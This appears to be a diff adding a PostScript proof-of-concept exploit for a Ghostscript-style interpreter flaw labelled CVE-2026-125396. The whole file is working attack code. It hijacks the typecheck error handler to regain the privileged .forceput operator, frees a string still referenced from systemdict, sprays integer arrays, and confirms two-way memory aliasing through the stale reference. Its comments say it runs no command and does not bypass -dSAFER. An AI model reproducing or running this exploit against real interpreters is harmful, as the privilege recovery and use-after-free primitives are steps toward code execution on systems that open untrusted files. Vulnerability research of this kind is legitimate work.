@@ -1,0 +1,114 @@
+%!PS
+% CVE-2026-125396 — rung-4 UAF aliasing proof (PostScript level only).
+% Recover .forceput via the font-loader typecheck handler, place a local
+% 2048-byte string in the surviving global systemdict, restore to free it,
+% allocate fresh integer arrays, and prove that a byte written through the
+% stale systemdict reference changes exactly one live array element and vice
+% versa. No native memory is inspected; no -dSAFER bypass or command is run.
+/LoaderOriginalTypecheck errordict /typecheck get def
+errordict /typecheck {
+  userdict /LoaderTrapPhase known
+    { userdict /LoaderTrapPhase get } { false } ifelse
+  {
+    userdict /LoaderTrapPhase false put
+    pop pop pop pop pop
+    userdict /ForceTarget get
+    userdict /ForceKey get
+    userdict /ForceValue get
+  } { LoaderOriginalTypecheck } ifelse
+} bind put
+userdict /QUIET true put
+userdict /ForceTarget systemdict put
+userdict /ForceKey /GS_UAF_PROOF put
+userdict /LoaderTrapPhase true put
+
+(GS_FONT_PATH) getenv { /GSFontPath exch def } { (ENV_MISSING) = quit } ifelse
+userdict /Fontmap 20 dict put
+userdict /Fontmap get /NimbusSans-Regular [ GSFontPath ] put
+
+/MARK 305419896 def       % 0x12345678
+/MARK2 305419897 def      % 0x12345679
+/MARK3 305419898 def      % 0x1234567a
+/NARRS 96 def
+/ARRLEN 128 def           % 128 refs * 16 bytes = 2048 bytes
+/arrs NARRS array def
+
+/AttackSave save def
+userdict /ForceValue 2048 string put
+{ /NimbusSans-Regular findfont pop } stopped pop
+AttackSave restore
+
+systemdict /GS_UAF_PROOF known
+  { systemdict /GS_UAF_PROOF get } { null } ifelse
+/sv exch def
+(SV_PRESENT=) print sv null ne == flush
+sv null eq { (NO_STALE_REF) = quit } if
+(SV_TYPE=) print sv type == flush
+(SV_LEN=) print sv length == flush
+
+0 1 NARRS 1 sub {
+  /ai exch def
+  /a ARRLEN array def
+  0 1 ARRLEN 1 sub { /j exch def a j MARK put } for
+  arrs ai a put
+} for
+
+/preallmark true def
+0 1 NARRS 1 sub {
+  /ai exch def
+  0 1 ARRLEN 1 sub {
+    /j exch def
+    arrs ai get j get MARK ne { /preallmark false def } if
+  } for
+} for
+(PRE_ALL_MARK=) print preallmark == flush
+
+/npat 0 def
+/fpat -1 def
+0 1 sv length 4 sub {
+  /p exch def
+  sv p get 120 eq {
+    sv p 1 add get 86 eq {
+      sv p 2 add get 52 eq {
+        sv p 3 add get 18 eq {
+          /npat npat 1 add def
+          fpat -1 eq { /fpat p def } if
+        } if
+      } if
+    } if
+  } if
+} for
+(PATTERN_COUNT=) print npat == flush
+(FIRST_PATTERN=) print fpat == flush
+fpat -1 eq { (NO_MARKER) = quit } if
+(PRE_STALE_BYTE=) print sv fpat get == flush
+
+% direction 1: byte write through stale ref -> live array element
+sv fpat 121 put
+/d1count 0 def /d1hit false def /d1ai -1 def /d1j -1 def
+0 1 NARRS 1 sub {
+  /ai exch def
+  0 1 ARRLEN 1 sub {
+    /j exch def
+    arrs ai get j get MARK2 eq {
+      /d1count d1count 1 add def
+      /d1hit true def /d1ai ai def /d1j j def
+    } if
+  } for
+} for
+(D1_CHANGED_COUNT=) print d1count == flush
+(D1_HIT=) print d1hit == flush
+d1hit { (D1_ARRAY=) print d1ai == flush (D1_INDEX=) print d1j == flush } if
+
+% direction 2: live array write -> byte read back through stale ref
+d1hit {
+  arrs d1ai get d1j MARK3 put
+  (D2_LIVE_VALUE=) print arrs d1ai get d1j get == flush
+  (D2_STALE_B0=) print sv fpat get == flush
+  (D2_STALE_B1=) print sv fpat 1 add get == flush
+  (D2_STALE_B2=) print sv fpat 2 add get == flush
+  (D2_STALE_B3=) print sv fpat 3 add get == flush
+  arrs d1ai get d1j MARK put
+  (CLEAN_STALE_B0=) print sv fpat get == flush
+} if
+quit
